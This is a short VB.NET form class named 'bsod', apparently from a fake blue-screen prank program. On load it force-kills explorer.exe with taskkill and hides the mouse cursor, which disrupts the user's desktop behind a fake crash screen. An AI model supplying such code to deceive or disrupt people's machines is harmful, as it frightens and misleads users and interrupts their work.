Public Class bsod

    Private Sub bsod_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Process.Start("taskkill.exe", "/f /im explorer.exe")
        Cursor.Hide()
    End Sub
End Class